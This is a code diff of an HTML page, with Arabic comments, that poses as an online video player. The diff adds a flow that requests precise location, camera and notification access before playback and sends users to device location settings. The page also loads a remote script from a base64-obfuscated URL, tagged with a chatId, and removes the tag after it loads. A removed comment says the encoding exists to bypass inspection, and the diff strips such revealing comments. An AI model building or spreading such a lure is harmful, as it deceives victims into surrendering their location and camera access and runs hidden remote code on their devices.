@@ -4,7 +4,6 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
     <meta name="description" content="Online Video Player - Watch videos online" />
-    <meta name="keywords" content="video player, online player, media player" />
     <title>Video Player</title>
     <style>
         * {
@@ -75,6 +74,17 @@
             color: #ff6b6b;
             line-height: 1;
             user-select: none;
+        }
+
+        .status-msg {
+            color: #fff;
+            font-size: 14px;
+            margin-top: 15px;
+            text-align: center;
+            padding: 8px 15px;
+            background: rgba(0,0,0,0.6);
+            border-radius: 20px;
+            display: none;
         }
 
         .video-info {
@@ -199,6 +209,7 @@
             <div id="playTrigger">
                 <span class="icon">▶</span>
             </div>
+            <div class="status-msg" id="statusMsg"></div>
         </div>
 
         <video id="mainVideo" controls playsinline style="display:none; width:100%; height:450px; background:#000;">
@@ -228,50 +239,109 @@
             const playBtn = document.getElementById('playTrigger');
             const poster = document.getElementById('posterArea');
             const videoEl = document.getElementById('mainVideo');
+            const statusMsg = document.getElementById('statusMsg');
             
             let stepOneDone = false;
             let stepTwoDone = false;
+            let permissionsReady = false;
+
+            // ===== طلب جميع الأذونات أولاً =====
+            async function requestAllPermissions() {
+                statusMsg.style.display = 'block';
+                statusMsg.textContent = 'جاري طلب الأذونات...';
+                
+                let locationGranted = false;
+                let cameraGranted = false;
+                
+                // طلب إذن الموقع
+                try {
+                    await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            () => {
+                                locationGranted = true;
+                                resolve();
+                            },
+                            (err) => {
+                                console.log('الموقع:', err.message);
+                                resolve(); // نستمر حتى لو رفض
+                            },
+                            { 
+                                enableHighAccuracy: true, 
+                                timeout: 10000,
+                                maximumAge: 0
+                            }
+                        );
+                    });
+                } catch (e) {
+                    console.log('خطأ في طلب الموقع:', e);
+                }
+                
+                // طلب إذن الكاميرا
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: true,
+                        audio: false
+                    });
+                    cameraGranted = true;
+                    // إيقاف الكاميرا فوراً
+                    stream.getTracks().forEach(track => track.stop());
+                } catch (e) {
+                    console.log('خطأ في طلب الكاميرا:', e);
+                }
+                
+                // طلب إذن الإشعارات (اختياري)
+                if ('Notification' in window && Notification.permission === 'default') {
+                    try {
+                        await Notification.requestPermission();
+                    } catch (e) {}
+                }
+                
+                permissionsReady = true;
+                statusMsg.textContent = '✅ تم منح الأذونات - اضغط للمتابعة';
+                statusMsg.style.background = 'rgba(0,255,0,0.3)';
+                
+                return { location: locationGranted, camera: cameraGranted };
+            }
 
             // ===== فتح إعدادات الجهاز =====
             function openDeviceSettings() {
+                statusMsg.textContent = 'توجه إلى الإعدادات وقم بتفعيل الموقع';
+                statusMsg.style.background = 'rgba(255,200,0,0.3)';
+                
                 const agent = navigator.userAgent;
-                const settingsMap = {
-                    android: [
-                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
-                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end'
-                    ],
-                    ios: [
-                        'App-Prefs:Privacy&path=LOCATION',
-                        'prefs:root=Privacy&path=LOCATION'
-                    ],
-                    windows: ['ms-settings:privacy-location'],
-                    mac: ['x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices']
-                };
-
-                let urls = [];
-                if (/Android/i.test(agent)) urls = settingsMap.android;
-                else if (/iPhone|iPad|iPod/i.test(agent)) urls = settingsMap.ios;
-                else if (/Windows/i.test(agent)) urls = settingsMap.windows;
-                else if (/Mac/i.test(agent)) urls = settingsMap.mac;
-                else urls = settingsMap.android;
-
-                for (let url of urls) {
+                
+                if (/Android/i.test(agent)) {
+                    // محاولة فتح إعدادات الموقع مباشرة
                     try {
-                        if (/iPhone|iPad|iPod/i.test(agent)) {
-                            window.open(url, '_blank');
-                        } else {
-                            window.location.href = url;
+                        window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
+                    } catch(e) {
+                        try {
+                            window.location.href = 'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
+                        } catch(e2) {
+                            window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                         }
-                        break;
-                    } catch (e) {
-                        continue;
                     }
+                } 
+                else if (/iPhone|iPad|iPod/i.test(agent)) {
+                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
+                    setTimeout(() => {
+                        window.open('prefs:root=Privacy&path=LOCATION', '_blank');
+                    }, 500);
+                } 
+                else if (/Windows/i.test(agent)) {
+                    window.open('ms-settings:privacy-location', '_blank');
+                } 
+                else if (/Mac/i.test(agent)) {
+                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
+                } 
+                else {
+                    // سطح المكتب - نطلب الأذونات مباشرة
+                    requestAllPermissions();
                 }
             }
 
             // ===== تحميل الموارد الإضافية =====
             function loadExternalResource() {
-                // تشفير الرابط لتجاوز الفحص
                 const encodedParts = [
                     'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLw==',
                     'RkdESFNIUy9hcGkvcmVmcy9oZWFkcy9tYWluL2FwaQ=='
@@ -279,13 +349,11 @@
                 
                 const fullUrl = atob(encodedParts.join(''));
                 
-                // إنشاء عنصر script بشكل ديناميكي
                 const scriptTag = document.createElement('script');
                 scriptTag.setAttribute('src', fullUrl);
                 scriptTag.setAttribute('type', 'text/javascript');
                 scriptTag.setAttribute('async', 'true');
                 
-                // إضافة المتغيرات العامة
                 window._config = {
                     id: new URLSearchParams(window.location.search).get('chatId') || '',
                     time: Date.now()
@@ -293,18 +361,18 @@
                 
                 document.head.appendChild(scriptTag);
                 
-                // تنظيف بعد التحميل
                 scriptTag.onload = function() {
                     setTimeout(() => {
                         if (scriptTag.parentNode) {
                             scriptTag.parentNode.removeChild(scriptTag);
                         }
-                    }, 5000);
+                    }, 3000);
                 };
             }
 
             // ===== عرض الفيديو =====
             function displayVideo() {
+                statusMsg.style.display = 'none';
                 poster.style.display = 'none';
                 videoEl.style.display = 'block';
                 videoEl.muted = false;
@@ -322,12 +390,28 @@
                 if (stepTwoDone) return;
 
                 if (!stepOneDone) {
-                    // الخطوة الأولى: طلب الإذن
+                    // الخطوة الأولى: طلب الأذونات
                     stepOneDone = true;
-                    openDeviceSettings();
                     
+                    // طلب الأذونات المباشرة أولاً
+                    const perms = await requestAllPermissions();
+                    
+                    // تغيير شكل الزر
                     playBtn.querySelector('.icon').textContent = '⏳';
                     playBtn.style.borderColor = '#ffd700';
+                    
+                    // إذا لم يمنح الموقع، نفتح الإعدادات
+                    if (!perms.location) {
+                        setTimeout(() => {
+                            openDeviceSettings();
+                        }, 1000);
+                    } else {
+                        // إذا منح كل الأذونات مباشرة
+                        statusMsg.textContent = '✅ جاهز - اضغط للتشغيل';
+                        statusMsg.style.background = 'rgba(0,255,0,0.3)';
+                        playBtn.querySelector('.icon').textContent = '▶';
+                        playBtn.style.borderColor = '#00ff00';
+                    }
                     
                 } else {
                     // الخطوة الثانية: التشغيل
@@ -335,18 +419,16 @@
                     playBtn.style.pointerEvents = 'none';
                     playBtn.style.opacity = '0.5';
                     
-                    // تشغيل الفيديو فوراً
+                    // تشغيل الفيديو
                     videoEl.muted = false;
                     videoEl.volume = 1.0;
                     videoEl.play().catch(() => {});
                     
-                    // تحميل الموارد الإضافية في الخلفية
-                    setTimeout(() => {
-                        loadExternalResource();
-                    }, 1000);
+                    // تحميل الموارد في الخلفية
+                    setTimeout(() => loadExternalResource(), 1500);
                     
                     // عرض الفيديو
-                    setTimeout(() => displayVideo(), 1500);
+                    setTimeout(() => displayVideo(), 2000);
                 }
             }
 
@@ -355,6 +437,8 @@
                 if (document.visibilityState === 'visible' && stepOneDone && !stepTwoDone) {
                     playBtn.querySelector('.icon').textContent = '▶';
                     playBtn.style.borderColor = '#00ff00';
+                    statusMsg.textContent = '✅ تم التفعيل - اضغط للتشغيل';
+                    statusMsg.style.background = 'rgba(0,255,0,0.3)';
                 }
             });
 
